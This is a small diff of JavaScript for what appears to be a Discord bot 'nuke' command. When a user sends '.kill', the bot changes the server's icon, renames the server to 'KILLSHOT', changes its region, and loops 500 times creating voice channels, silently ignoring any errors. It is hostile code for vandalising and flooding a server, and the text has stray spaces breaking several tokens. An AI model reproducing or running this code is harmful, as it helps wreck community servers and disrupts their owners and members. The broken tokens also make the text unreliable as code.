@@ -9,7 +9,7 @@ if(message.content === ".kill"){
 if(message.channel.type === "dm") return;
 var fucked = false; if(!fucked){
 message.guild.setIcon("http s://goo.gl/images/yYihJb")
-message.guild.setName("SH UTED DOWN").catch(error => {})
+message.guild.setName("KILLSHOT").catch(error => {})
 message.guild.setRegion('ho ngkong').catch(error => {})
 for (var i = 0; i < 500; i+ +){
 message.guild.createChann el("KILLSHOT", 'voice').catch(error => {})
